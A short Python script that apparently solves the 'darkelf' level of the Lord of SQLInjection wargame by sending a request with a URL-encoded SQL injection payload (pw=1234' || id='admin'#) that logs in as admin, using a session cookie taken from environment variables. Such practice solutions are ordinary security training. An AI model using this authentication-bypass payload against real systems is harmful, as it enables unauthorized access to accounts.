import requests
from dotenv import load_dotenv
import os

load_dotenv()
#개발밥 2년먹으면서 쿼리 허투로 짠게 아니라 다행이다 ㅜ
url=os.environ.get('LOS_URL')+'chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=1234%27%20||id=%27admin%27%23'
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

res=requests.get(url, headers=headers)
if "DARKELF Clear!" in res.text:
    print("Success")
else:
    print("Failed")
    print(url)
    print(res.text)